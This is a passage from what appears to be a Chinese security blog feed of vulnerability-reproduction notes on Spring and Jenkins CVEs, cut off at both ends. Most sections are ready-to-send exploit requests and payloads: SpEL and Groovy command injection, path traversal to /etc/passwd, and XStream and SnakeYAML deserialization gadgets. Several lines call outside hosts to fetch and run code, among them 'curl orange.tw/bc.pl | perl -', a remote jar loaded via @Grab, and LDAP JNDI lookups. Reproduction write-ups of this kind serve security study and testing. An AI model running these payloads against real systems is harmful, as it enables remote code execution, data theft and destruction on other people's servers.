rel="noopener">https://www.seebug.org/vuldb/ssvid-97287</a></p><p>此漏洞和CVE-2016-4977类似</p><p>POC：</p><pre><code>http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.baidu.com&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D</code></pre><h3 id="CVE-2018-15758-spring-security-oauth2权限提升"><a href="#CVE-2018-15758-spring-security-oauth2权限提升" class="headerlink" title="CVE-2018-15758 spring-security-oauth2权限提升"></a>CVE-2018-15758 spring-security-oauth2权限提升</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3至2.3.3Spring Security OAuth 2.2至2.2.2Spring Security OAuth 2.1至2.1.2Spring Security OAuth 2.0到2.0.15</code></pre><p>使用了EnableResourceServer并且用了<code>AuthorizationRequest</code>的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。</p><p>例如劫持code，并且篡改其中的scope到all的话：</p><pre><code>http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://127.0.0.1&amp;scope=openid</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131712.png" alt="image-20200401094048949"></p><p>即授权了读取权限的时候，修改为all就可以获得全部权限。</p><h3 id="CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历"><a href="#CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历" class="headerlink" title="CVE-2019-3799 Spring Cloud Config Server: 目录遍历"></a>CVE-2019-3799 Spring Cloud Config Server: 目录遍历</h3><p>影响版本：Spring-Cloud-Config-Server  &lt; 2.1.2, 2.0.4, 1.4.6</p><p>下载受影响的版本构建：<a href="https://github.com/spring-cloud/spring-cloud-config" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config</a></p><pre><code>cd spring-cloud-config-server                                                                   ../mvnw spring-boot:run</code></pre><p>构建成功后访问：</p><pre><code>http://127.0.0.1:8888/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd    </code></pre><p><img src="Spring 漏洞.assets/image-20200401100511941.png" alt="image-20200401100511941"></p><p>其中路径代表：<code>/{name}/{profile}/{label}/</code>，如下中所显示的json。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131715.png" alt="image-20200401102213915"></p><h3 id="CVE-2019-3778-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-3778-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-3778 Spring Security OAuth 开放重定向"></a>CVE-2019-3778 Spring Security OAuth 开放重定向</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3 to 2.3.4Spring Security OAuth 2.2 to 2.2.3Spring Security OAuth 2.1 to 2.1.3Spring Security OAuth 2.0 to 2.0.16</code></pre><p><a href="https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70" target="_blank" rel="noopener">https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70</a></p><p>用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。</p><p>例如原始请求如下：</p><pre><code>/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://localhost:8086/login</code></pre><p>只需要修改为：</p><pre><code>/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://%localhost:8086/login</code></pre><p>这样就不会产生原本的认证错误，而且直接跳转到地址</p><pre><code>Location: http://localhost:8086/login</code></pre><h3 id="CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><a href="#CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞" class="headerlink" title="CNVD-2019-11630 Spring Boot Actuator命令执行漏洞"></a>CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</h3><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#</a></p><p>这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点</p><ol><li>Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。</li></ol><pre><code>/dump-显示线程转储（包括堆栈跟踪）/trace-显示最后几条HTTP消息（其中可能包含会话标识符）/logfile-输出日志文件的内容/shutdown-关闭应用程序/mappings-显示所有MVC控制器映射/env-提供对配置环境的访问/restart-重新启动应用程序</code></pre><ol start="2"><li>jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a href="http://127.0.0.1:8090/jolokia/list" target="_blank" rel="noopener">http://127.0.0.1:8090/jolokia/list</a></li></ol><p>Logback库提供的<strong>reloadByURL</strong>操作使我们可以从外部URL重新加载日志配置，地址如：</p><pre><code>http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xmllogback.xml：&lt;configuration&gt;  &lt;insertFromJNDI env-entry-name=&quot;ldap://artsploit.com:1389/jndi&quot; as=&quot;appName&quot; /&gt;&lt;/configuration&gt;</code></pre><p>reloadByURL功能从<a href="http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。" target="_blank" rel="noopener">http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。</a></p><ol start="3"><li>通过/env来修改配置</li></ol><p>如果Spring Cloud Libraries在类路径中，则<strong>‘/ env’</strong>端点允许您修改Spring环境属性。</p><pre><code class="html">POST /env HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 65eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream</code></pre><p>此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client &lt;1.8.7，则可以利用其中的<strong>XStream反序列化漏洞</strong>。</p><p>其中xstream的内容类似如下：</p><pre><code>&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;command&gt;                      &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;                    &lt;/command&gt;                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                  &lt;/next&gt;                &lt;/iter&gt;                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                    &lt;name&gt;start&lt;/name&gt;                    &lt;parameter-types/&gt;                  &lt;/method&gt;                  &lt;name&gt;foo&lt;/name&gt;                &lt;/filter&gt;                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;              &lt;/serviceIterator&gt;              &lt;lock/&gt;            &lt;/cipher&gt;            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;            &lt;ibuffer&gt;&lt;/ibuffer&gt;          &lt;/is&gt;        &lt;/dataSource&gt;      &lt;/dataHandler&gt;    &lt;/value&gt;  &lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;</code></pre><p>然后调用’/ refresh’端点。</p><ol start="4"><li>有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li></ol><pre><code class="html">POST /env HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 59spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml</code></pre><p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。</p><pre><code class="html">POST /refresh HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p>从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：</p><pre><code class="html">!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL [&quot;http://artsploit.com/yaml-payload.jar&quot;]  ]]]</code></pre><p>该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p><ol start="5"><li>/env配置</li></ol><p>除了关于执行RCE的地方，还有一些设置也很有用。</p><p><strong>spring.datasource.tomcat.validationQuery = drop + table + users-</strong>允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p><p><strong>spring.datasource.tomcat.url</strong> = jdbc:hsqldb:<a href="https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。" target="_blank" rel="noopener">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p><p>这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。</p><h3 id="CVE-2019-11269-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-11269-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-11269 Spring Security OAuth 开放重定向"></a>CVE-2019-11269 Spring Security OAuth 开放重定向</h3><p>此漏洞为CVE-2019-3778的延伸版本，效果一致</p><p>影响版本：</p><pre><code>Spring Security OAuth 2.3至2.3.5Spring Security OAuth 2.2至2.2.4Spring Security OAuth 2.1至2.1.4Spring Security OAUth 2.0至2.0.17</code></pre><h3 id="CVE-2020-5398-Spring-Framework-RFD漏洞"><a href="#CVE-2020-5398-Spring-Framework-RFD漏洞" class="headerlink" title="CVE-2020-5398 Spring Framework RFD漏洞"></a>CVE-2020-5398 Spring Framework RFD漏洞</h3><p>影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16</p><p>触发此漏洞的要求可以控制<code>content-disposition</code>文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。</p><pre><code>&lt;a href=”https://&lt;trusted-server&gt;.com/api/users/&lt;attacker_id&gt;.cmd&quot; download&gt;Click me, Im a dolphin&lt;/a&gt;</code></pre><p>先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。</p><p>由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。</p><p>spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。</p><p>当受害者点击如上的地址时，会下载一个&lt;attacker_id&gt;.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</p><p>但是这个设置可以绕过，采用如下形式：</p><pre><code>filename：secure_install.cmd&quot;;</code></pre><p>会在表头中闭合造成如下效果：</p><pre><code>Content-Disposition: attachment; filename=&quot;secure_install.cmd&quot;;.txt&quot;</code></pre><p>从而达到绕过限制来下载预先设定好的可执行文件等。</p><h3 id="CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露"><a href="#CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露" class="headerlink" title="CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露"></a>CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露</h3><p>影响版本：spring-cloud-config-server &lt; 2.2.2</p><p><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md</a></p><p>poc：</p><pre><code>利用点1：curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp/aaa.xxx读取/User/xuanyonghao/tmp/aaa.xxx文件foo 对应 {application}profiles 对应 {profiles}%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 {label}todo 条件限制：todo 1. 文件必须有后缀，也就是.txt等等。todo 2. cloud: config: server: native: search-locations: file:///tmp/{label}，此处的目录需要有{application}或{profiles}或{label}，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀利用点2：org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)利用此处把label处的(_)替换为/curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxxtodo 条件限制：todo 1. 文件必须有后缀，也就是.txt等等。todo 2. 不像利用点1处，不需要配置{application}{profiles}{label}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。&lt;/p&gt;
&lt;h3 id=&quot;CVE-2010-1622-Spring-Framewor
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins漏洞集合复现</title>
    <link href="/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/"/>
    <id>/2020/03/Jenkins漏洞集合复现/</id>
    <published>2020-03-27T06:56:40.000Z</published>
    <updated>2020-03-27T07:07:18.135Z</updated>
    
    <content type="html"><![CDATA[<p>复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。</p><h3 id="CVE-2015-8103-反序列化远程代码执行"><a href="#CVE-2015-8103-反序列化远程代码执行" class="headerlink" title="CVE-2015-8103 反序列化远程代码执行"></a>CVE-2015-8103 反序列化远程代码执行</h3><p>1.638之前的Jenkins和1.625.2之前的LTS中的Jenkins CLI子系统，允许远程攻击者通过制作的序列化Java对象执行有问题的commons-collections。</p><p>利用脚本：<a href="https://github.com/LeoHuang2015/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/LeoHuang2015/jenkins-cli-exploit</a></p><p>执行后有类似如下反应：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145130.png" alt="image-20200327115239320"></p><p>还可以使用msf中的模块<code>exploit/linux/misc/jenkins_java_deserialize</code>来执行攻击反弹shell。</p><h3 id="CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞"><a href="#CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞" class="headerlink" title="CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞"></a>CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞</h3><p>CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模块中存在安全漏洞。远程攻击者可通过打开JRMP监听程序利用该漏洞执行任意代码。</p><p>利用需要X-Jenkins-CLI2-Port对应的端口，如果Jenkins无法获取CLI版本2的端口标头“ X-Jenkins-CLI2-Port”，它会退回到版本1。</p><p>利用ys生成二进制文件：<code>java -jar ysoserial.jar CommonsCollections3 &quot;curl http://r9rub4.ceye.io/&quot; &gt; payload.bin</code></p><p>利用脚本：<code>https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py</code></p><p>发送的二进制文件实际上是十六进制的(&lt;===[JENKINS REMOTING CAPACITY]===&gt;)与其后base64的编码构成。使用类似反应如下：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145133.png" alt="image-20200327121322560"></p><h3 id="CVE-2016-0792-低权限用户命令执行"><a href="#CVE-2016-0792-低权限用户命令执行" class="headerlink" title="CVE-2016-0792 低权限用户命令执行"></a>CVE-2016-0792 低权限用户命令执行</h3><p>影响版本：jenkins小于 1.650</p><p>利用脚本：<code>https://github.com/jpiechowka/jenkins-cve-2016-0792</code></p><p>执行后类似如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145135.png" alt="image-20200327120724417"></p><h3 id="CVE-2016-9299-代码执行"><a href="#CVE-2016-9299-代码执行" class="headerlink" title="CVE-2016-9299 代码执行"></a>CVE-2016-9299 代码执行</h3><p>2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对第三方服务器的LDAP查询。</p><p>关于这个漏洞的分析和代码利用，已经有详细的分析文章：<code>https://paper.seebug.org/199/</code></p><p>msf有成熟的利用模块：<code>exploit/linux/misc/jenkins_ldap_deserialize</code></p><h3 id="CVE-2017-1000353-Jenkins-CI-远程代码执行"><a href="#CVE-2017-1000353-Jenkins-CI-远程代码执行" class="headerlink" title="CVE-2017-1000353 Jenkins-CI 远程代码执行"></a>CVE-2017-1000353 Jenkins-CI 远程代码执行</h3><p>影响版本：Jenkins&lt;=2.56。Jenkins LTS &lt;= 2.46.1</p><p>下载poc<code>https://github.com/vulhub/CVE-2017-1000353</code></p><p>执行生成字节码文件。</p><pre><code>java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  &quot;curl http://xxx.ceye.io&quot;</code></pre><p>利用py文件来进行发送</p><pre><code>python exploit.py http://x.x.x.x:8080 jenkins_poc.ser</code></pre><p>会有如下反应</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145340.png" alt="image-20200325165630218"></p><h3 id="CVE-2018-1000110-用户枚举"><a href="#CVE-2018-1000110-用户枚举" class="headerlink" title="CVE-2018-1000110 用户枚举"></a>CVE-2018-1000110 用户枚举</h3><pre><code>模糊搜索：http://x.x.x.x:8080/search/?q=a</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145344.png" alt="image-20200325165813965"></p><pre><code>http://x.x.x.x:8080/search/suggest?query=a</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145347.png" alt="image-20200325165911492"></p><p>如果git插件小于3.7，也可以使用如下</p><pre><code>http://x.x.x.x:8080/git/search/?q=ahttp://x.x.x.x:8080/git/search/suggest?query=a</code></pre><h3 id="CVE-2018-1000861-远程命令执行"><a href="#CVE-2018-1000861-远程命令执行" class="headerlink" title="CVE-2018-1000861 远程命令执行"></a>CVE-2018-1000861 远程命令执行</h3><p>可以使用如下的一键化脚本</p><pre><code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></pre><p>也可以自定义发送请求</p><pre><code>http://x.x.x.x:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x {public x(){&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;.execute()}}</code></pre><p>页面返回空白，响应为</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145447.png" alt="image-20200325171107715"></p><p>如果使用脚本，则同样效果</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145454.png" alt="image-20200325171239538"></p><p>还可以使用的POC，使用会提示错误信息，但命令已执行。</p><pre><code>/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;)%7d)%0aclass+Person%7b%7d/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+&quot;curl http://xxx.ceye.io/CVE-2018-1000861&quot;.execute().text+%7d)%0aclass+Person%7b%7d</code></pre><h3 id="CVE-2018-1999002-任意文件读取"><a href="#CVE-2018-1999002-任意文件读取" class="headerlink" title="CVE-2018-1999002 任意文件读取"></a>CVE-2018-1999002 任意文件读取</h3><p>影响版本：Jenkins weekly 2.132 以及更早的版本。Jenkins LTS 2.121.1 以及更早的版本</p><p>可以读取Windows系统服务器中的任意文件，且在特定而条件下也可以读取Linux系统服务器中的文件.</p><p>详情：<code>https://xz.aliyun.com/t/2486</code></p><p>结合payload来看，我们请求的url为<code>/plugin/credentials/.ini</code>，则<code>base</code>为空，扩展名（ext变量）即为<code>.ini</code>，然后通过一系列的尝试openURL，在此例中即最后一个情形<code>con = openURL(map(base+&#39;_&#39;+ locale.getLanguage()+ext));</code>，会去请求<code>_../../../../../../../../../../../../windows/win.ini</code> ，尽管目录<code>_..</code>并不存在，但在win下可以直接通过路径穿越来绕过。但在linux，则需要一个带有<code>_</code>的目录来想办法绕过。</p><p>需要已经开启了匿名用户读取权限，在请求头中添加</p><pre><code>Accept-Language: /../../../../../../../../etc/passwd</code></pre><p>处理请求中的包含路径，比如/plugin/xxxx，可以尝试</p><pre><code>/plugin/jquery-detached/.xml/plugin/jquery-detached/.key/plugin/credentials/.ini</code></pre><p>在Windows下这么使用</p><pre><code>GET /plugin/credentials/.ini HTTP/1.1Host: x.x.x.x:8080Accept: text/javascript, text/html, application/xml, text/xml, */*X-Prototype-Version: 1.7DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36Origin: http://x.x.x.x:8080Referer: http://x.x.x.x:8080/Accept-Encoding: gzip, deflateAccept-Language: /../../../../../../../../etc/passwdCookie: JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971Connection: close</code></pre><h3 id="CVE-2018-1000600-Jenkins-GitHub-信息泄露"><a href="#CVE-2018-1000600-Jenkins-GitHub-信息泄露" class="headerlink" title="CVE-2018-1000600 Jenkins GitHub 信息泄露"></a>CVE-2018-1000600 Jenkins GitHub 信息泄露</h3><p>影响版本：Jenkins GitHub插件小于1.29.1</p><p>利用的POC为，其中user1为用户名。</p><pre><code>/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://xxx.ceye.io</code></pre><p>执行后显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145502.png" alt="image-20200326173809956"></p><p>查看DNSlog回显</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145507.png" alt="image-20200326173837239"></p><h3 id="CVE-2019-1003000-远程代码执行"><a href="#CVE-2019-1003000-远程代码执行" class="headerlink" title="CVE-2019-1003000 远程代码执行"></a>CVE-2019-1003000 远程代码执行</h3><p>实际影响版本及编号：<strong>CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</strong></p><p>拥有Overall/Read 权限的用户可以绕过沙盒保护，在jenkins可以执行任意代码。此漏洞需要一个账号密码和一个存在的job。受影响插件版本：Pipeline: Declarative 插件 &lt;= 1.3.4。Pipeline: Groovy 插 件 &lt;= 2.61。Script Security 插 件 &lt;= 1.49。</p><p>下载环境和利用代码：<code>https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</code></p><p>执行利用后显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145513.png" alt="image-20200326112837107"></p><p>我们的job中也被添加了如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145517.png" alt="image-20200326112903149"></p><h3 id="CVE-2019-1003005-远程代码执行"><a href="#CVE-2019-1003005-远程代码执行" class="headerlink" title="CVE-2019-1003005 远程代码执行"></a>CVE-2019-1003005 远程代码执行</h3><p>受影响版本：</p><pre><code>Jenkins 2.53Jenkins 2.122Jenkins 2.137Jenkins 2.138 启用匿名读取Jenkins 2.152 启用匿名读取Jenkins 2.153 启用匿名读取Script Security Plugin 1.43Script Security Plugin 1.48</code></pre><p>下载利用脚本：<code>https://github.com/orangetw/awesome-jenkins-rce-2019</code></p><p>构建环境后，执行脚本如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145520.png" alt="image-20200326124130037"></p><p>显示如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145522.png" alt="image-20200326124151396"></p><p>当然如果不想使用这种一键式脚本还可以自己构造jar来利用</p><ol><li>创建Payload.java</li></ol><pre><code>public class Payload {    public Payload(){        try {            String payload = &quot;curl orange.tw/bc.pl | perl -&quot;;            String[] cmds = {&quot;/bin/bash&quot;, &quot;-c&quot;, payload};            java.lang.Runtime.getRuntime().exec(cmds);        } catch (Exception e) { }    }}</code></pre><ol start="2"><li>编译文件，创建META-INF/services/文件夹，同时在文件夹下创建名为org.codehaus.groovy.plugins.Runners的文件。内容随意，比如Payload</li><li>文件创建后，在某一目录下，文件树类似如下：</li></ol><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145524.png" alt="image-20200327093359850"></p><ol start="4"><li>编译以上目录<code>jar cvf poc-1.jar code/</code></li><li>将编译产生的文件移动到类似如下地址<code>cp poc-1.jar ~/www/code/payload/poc/1/</code></li><li>将www目录移动到web服务器中，地址类似：<code>http://xxx.com/code/payload/poc/1.poc-1.jar</code></li><li>利用如下exp</li></ol><pre><code>http://&lt;TARGET HOST&gt;/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=&#39;payload&#39;, root=&#39;http://&lt;EXPLOIT HOST&gt;&#39;)%0a@Grab(group=&#39;package&#39;, module=&#39;payload&#39;, version=&#39;1&#39;)%0aimport Payload;</code></pre><h3 id="CVE-2019-1003029-Script-Security-Plugin沙箱绕过"><a href="#CVE-2019-1003029-Script-Security-Plugin沙箱绕过" class="headerlink" title="CVE-2019-1003029 Script Security Plugin沙箱绕过"></a>CVE-2019-1003029 Script Security Plugin沙箱绕过</h3><p>此漏洞和CVE-2019-1003005漏洞同样都是由Script Security插件引起。利用方式和上一致。影响版本1.55以下。</p><h3 id="CVE-2019-10392-Jenkins-Git-插件命令执行"><a href="#CVE-2019-10392-Jenkins-Git-插件命令执行" class="headerlink" title="CVE-2019-10392 Jenkins Git 插件命令执行"></a>CVE-2019-10392 Jenkins Git 插件命令执行</h3><p>之前做过这个漏洞的复现，地址：<a href="https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19认证远程RCE/" target="_blank" rel="noopener">https://misakikata.github.io/2019/09/CVE-2019-10392-Jenkins-2k19%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8BRCE/</a></p><h3 id="CVE-2019-10352-任意文件写入"><a href="#CVE-2019-10352-任意文件写入" class="headerlink" title="CVE-2019-10352 任意文件写入"></a>CVE-2019-10352 任意文件写入</h3><p>该漏洞使经过身份验证的具有Job/Configure权限的攻击者可以使用目标之外的文件名定义文件参数，从而导致任意文件写入。</p><p>创建一个名为test的新“自由式项目”（该项目的工作空间将位于JENKINS_HOME/workspace/test）</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145528.png" alt="image-20200327131927499"></p><p>创建一个受限制的用户，提供总体读取和作业构建，配置和读取权限。在配置中选择文件参数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145529.png" alt="image-20200327132432562"></p><p>单击构建选择上传文件，上传一个1.png</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145532.png" alt="image-20200327132552837"></p><p>开始构建就可以将其写入运行Jenkins的用户有权写入的文件系统上的任何位置。</p><h3 id="CVE-2019-10300-GitLab插件信息泄露漏洞"><a href="#CVE-2019-10300-GitLab插件信息泄露漏洞" class="headerlink" title="CVE-2019-10300 GitLab插件信息泄露漏洞"></a>CVE-2019-10300 GitLab插件信息泄露漏洞</h3><p>Jenkins GitLab插件1.5.11 的功能中存在一个可利用的信息泄露漏洞。来自具有“ 